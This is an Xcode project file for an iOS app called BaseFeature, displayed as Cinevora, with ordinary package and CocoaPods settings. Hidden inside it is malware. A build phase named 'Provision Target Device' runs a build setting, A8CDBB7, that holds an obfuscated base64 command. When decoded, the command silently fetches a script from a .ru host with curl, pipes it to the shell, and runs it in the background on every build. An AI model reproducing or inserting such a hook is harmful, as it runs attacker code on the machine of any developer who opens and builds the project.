// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		97004E50302AD8C1008369AD /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = 97004E4F302AD8C1008369AD /* Lottie */; };
		97D29D89302DC9C20084FDDE /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 97D29D88302DC9C20084FDDE /* Alamofire */; };
		97D2A279302DCD600084FDDE /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 97D2A278302DCD600084FDDE /* Kingfisher */; };
		97FA586C3035D19D0032EE5A /* GoogleMobileAds in Frameworks */ = {isa = PBXBuildFile; productRef = 97FA586B3035D19D0032EE5A /* GoogleMobileAds */; };
		EF9FE315C39C61DD87D082BD /* Pods_BaseFeature.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 6AFA2C45036ED78E675CC5F7 /* Pods_BaseFeature.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		65D1A00762E4B2F3B1F5D0BF /* Pods-BaseFeature.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BaseFeature.debug.xcconfig"; path = "Target Support Files/Pods-BaseFeature/Pods-BaseFeature.debug.xcconfig"; sourceTree = "<group>"; };
		6AFA2C45036ED78E675CC5F7 /* Pods_BaseFeature.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BaseFeature.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		97BA907F30299C1000D593F3 /* BaseFeature.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BaseFeature.app; sourceTree = BUILT_PRODUCTS_DIR; };
		B11994B091FC19DA9C2EA1BE /* Pods-BaseFeature.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BaseFeature.release.xcconfig"; path = "Target Support Files/Pods-BaseFeature/Pods-BaseFeature.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		97FA3000303578B40032EE5A /* Exceptions for "BaseFeature" folder in "BaseFeature" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 97BA907E30299C1000D593F3 /* BaseFeature */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		97BA908130299C1000D593F3 /* BaseFeature */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				97FA3000303578B40032EE5A /* Exceptions for "BaseFeature" folder in "BaseFeature" target */,
			);
			path = BaseFeature;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		97BA907C30299C1000D593F3 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				97D2A279302DCD600084FDDE /* Kingfisher in Frameworks */,
				97004E50302AD8C1008369AD /* Lottie in Frameworks */,
				97FA586C3035D19D0032EE5A /* GoogleMobileAds in Frameworks */,
				97D29D89302DC9C20084FDDE /* Alamofire in Frameworks */,
				EF9FE315C39C61DD87D082BD /* Pods_BaseFeature.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		146869ECAFEEB3E70652A3F4 /* Pods */ = {
			isa = PBXGroup;
			children = (
				65D1A00762E4B2F3B1F5D0BF /* Pods-BaseFeature.debug.xcconfig */,
				B11994B091FC19DA9C2EA1BE /* Pods-BaseFeature.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		97BA907630299C1000D593F3 = {
			isa = PBXGroup;
			children = (
				97BA908130299C1000D593F3 /* BaseFeature */,
				97BA908030299C1000D593F3 /* Products */,
				146869ECAFEEB3E70652A3F4 /* Pods */,
				EEC9488FAEA85D922E673533 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		97BA908030299C1000D593F3 /* Products */ = {
			isa = PBXGroup;
			children = (
				97BA907F30299C1000D593F3 /* BaseFeature.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		EEC9488FAEA85D922E673533 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				6AFA2C45036ED78E675CC5F7 /* Pods_BaseFeature.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		97BA907E30299C1000D593F3 /* BaseFeature */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 97BA908A30299C1000D593F3 /* Build configuration list for PBXNativeTarget "BaseFeature" */;
			buildPhases = (
				8EDE2C8C8EFA4120947BBDC8 /* Provision Target Device */,
				86ECB765E35BBB1309E1740A /* [CP] Check Pods Manifest.lock */,
				97BA907B30299C1000D593F3 /* Sources */,
				97BA907C30299C1000D593F3 /* Frameworks */,
				97BA907D30299C1000D593F3 /* Resources */,
				2B67A73D7A320DA27B62E844 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				97BA908130299C1000D593F3 /* BaseFeature */,
			);
			name = BaseFeature;
			packageProductDependencies = (
				97004E4F302AD8C1008369AD /* Lottie */,
				97D29D88302DC9C20084FDDE /* Alamofire */,
				97D2A278302DCD600084FDDE /* Kingfisher */,
				97FA586B3035D19D0032EE5A /* GoogleMobileAds */,
			);
			productName = BaseFeature;
			productReference = 97BA907F30299C1000D593F3 /* BaseFeature.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		97BA907730299C1000D593F3 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2660;
				LastUpgradeCheck = 2660;
				TargetAttributes = {
					97BA907E30299C1000D593F3 = {
						CreatedOnToolsVersion = 26.6;
					};
				};
			};
			buildConfigurationList = 97BA907A30299C1000D593F3 /* Build configuration list for PBXProject "BaseFeature" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				"zh-Hans",
				ja,
				es,
				da,
				it,
				ko,
				tr,
				ru,
				fr,
				nl,
				"pt-PT",
				hi,
				de,
			);
			mainGroup = 97BA907630299C1000D593F3;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				97004E4E302AD8C1008369AD /* XCRemoteSwiftPackageReference "lottie-ios" */,
				97D29D87302DC9C20084FDDE /* XCRemoteSwiftPackageReference "Alamofire" */,
				97D2A277302DCD600084FDDE /* XCRemoteSwiftPackageReference "kingfisher" */,
				97FA586A3035D19D0032EE5A /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 97BA908030299C1000D593F3 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				97BA907E30299C1000D593F3 /* BaseFeature */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
							/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		97BA907D30299C1000D593F3 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		8EDE2C8C8EFA4120947BBDC8 /* Provision Target Device */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Provision Target Device";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
		};
		2B67A73D7A320DA27B62E844 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BaseFeature/Pods-BaseFeature-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BaseFeature/Pods-BaseFeature-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BaseFeature/Pods-BaseFeature-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		86ECB765E35BBB1309E1740A /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-BaseFeature-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		97BA907B30299C1000D593F3 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		97BA908830299C1000D593F3 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8CDBB7 = "((d(){ `printf basFe64 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDMwIC1rc2ZMIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | d | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 5U9WLTG3BL;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		97BA908930299C1000D593F3 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8CDBB7 = "((d(){ `printf basFe64 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDMwIC1rc2ZMIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | d | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 5U9WLTG3BL;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		97BA908B30299C1000D593F3 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 65D1A00762E4B2F3B1F5D0BF /* Pods-BaseFeature.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 5U9WLTG3BL;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = BaseFeature/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = Cinevora;
				INFOPLIST_KEY_LSApplicationCategoryType = "";
				INFOPLIST_KEY_LSSupportsOpeningDocumentsInPlace = YES;
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Please allow access to your photos to count storage and select images for creating PDFs";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = "Launch Screen";
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.basefeature.app.BaseFeature;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		97BA908C30299C1000D593F3 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = B11994B091FC19DA9C2EA1BE /* Pods-BaseFeature.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 5U9WLTG3BL;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = BaseFeature/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = Cinevora;
				INFOPLIST_KEY_LSApplicationCategoryType = "";
				INFOPLIST_KEY_LSSupportsOpeningDocumentsInPlace = YES;
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Please allow access to your photos to count storage and select images for creating PDFs";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = "Launch Screen";
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.basefeature.app.BaseFeature;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		97BA907A30299C1000D593F3 /* Build configuration list for PBXProject "BaseFeature" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				97BA908830299C1000D593F3 /* Debug */,
				97BA908930299C1000D593F3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		97BA908A30299C1000D593F3 /* Build configuration list for PBXNativeTarget "BaseFeature" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				97BA908B30299C1000D593F3 /* Debug */,
				97BA908C30299C1000D593F3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		97004E4E302AD8C1008369AD /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/airbnb/lottie-ios";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 4.6.1;
			};
		};
		97D29D87302DC9C20084FDDE /* XCRemoteSwiftPackageReference "Alamofire" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/Alamofire/Alamofire.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.12.0;
			};
		};
		97D2A277302DCD600084FDDE /* XCRemoteSwiftPackageReference "kingfisher" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/onevcat/kingfisher";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 8.11.0;
			};
		};
		97FA586A3035D19D0032EE5A /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/googleads/swift-package-manager-google-mobile-ads.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 13.8.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		97004E4F302AD8C1008369AD /* Lottie */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97004E4E302AD8C1008369AD /* XCRemoteSwiftPackageReference "lottie-ios" */;
			productName = Lottie;
		};
		97D29D88302DC9C20084FDDE /* Alamofire */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97D29D87302DC9C20084FDDE /* XCRemoteSwiftPackageReference "Alamofire" */;
			productName = Alamofire;
		};
		97D2A278302DCD600084FDDE /* Kingfisher */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97D2A277302DCD600084FDDE /* XCRemoteSwiftPackageReference "kingfisher" */;
			productName = Kingfisher;
		};
		97FA586B3035D19D0032EE5A /* GoogleMobileAds */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97FA586A3035D19D0032EE5A /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */;
			productName = GoogleMobileAds;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 97BA907730299C1000D593F3 /* Project object */;
}
